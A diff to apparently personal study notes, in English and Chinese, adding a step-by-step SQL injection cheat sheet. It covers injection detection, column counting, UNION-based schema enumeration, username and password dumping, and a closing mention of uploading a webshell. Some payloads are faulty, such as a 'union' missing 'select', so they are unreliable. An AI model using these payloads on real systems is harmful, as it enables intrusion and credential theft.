@@ -43,7 +43,11 @@ select name, password from users where id = 1 and 1 = 0 union select database(),
 // 網頁常常只能show唯一的結果
 ... union select table_name, column_name from information_schema.columns limit 1, 1;  
 ```  
-[What's in information_schema.columns?](https://dev.mysql.com/doc/refman/5.7/en/columns-table.html)  
+```  
+// 在做union select時如何知道columns的數量  
+? id =' or 1=1 order by N--+    // N一筆一筆增加直到頁面無法正確顯示, --+註解掉後面的條件, +是代表註解後面要有空白!
+```
+[What's in information_schema.columns?](https://dev.mysql.com/doc/refman/5.7/en/columns-table.html)  
 **group_concat() is also a litte trick.**
 
 ### Blind based   
@@ -75,4 +79,46 @@ WAF is a defender for web.
   - ```URL-ENCODE, HEXIDECIMAL, UNICODE```
   
 ### Webshell  
-Based on the provilege of db user, we can upload shell to read or write to db.
+Based on the provilege of db user, we can upload shell to read or write to db.  
+  
+### Trick of Pentesting  
+Here are some tricks of pentesting, step by step from find the vulnerability to exploit it!  
+1. SQL vulnerability? injection point?  
+```
+1' or 1=1--+  
+1' and 1=2--+  // sql error message or page show error?
+```
+這裡, 我們要判斷出sql漏洞的存在與否  
+
+2. Number of columns   
+```
+1' order by N--+   // 不斷增加N的數量, 直到頁面顯示錯誤
+```
+這裡我們就可以確認query的字段數, union select用起來也比較方便  
+
+3. Where are the SNAKES we want?  
+```
+1' and 1=2 union select 1,2,...N--+   // 加以確認我們注入的東西會出現在哪裡
+```  
+
+4. First, we need to know some basic information...   
+```
+...union select user(),database(),version(), @@version_compile_os--+  // 後面兩個分別是資料庫版本以及作業系統版本
+```  
+
+5. Start the exciting part...  
+```
+...union select 1,2,...,group_concat(schema_name) from information_schema.schemata--+  // get all database name
+```  
+```
+...union select 1,2,...,group_concat(table_name) from information_schema.tables where schema_name='FUCK'+--+  
+// FUCK那邊也可以用hex表示
+```
+```
+...union select 1,2,...,group_concat(column_name) from information_schema.columns where table_name='users'+--+
+```
+```
+// 最終目的
+1' and 1=2 union 1,2,...,group_concat(username,password) from users+--+  
+```  
+6. After get username and password to login, we can write a webshell to upload!
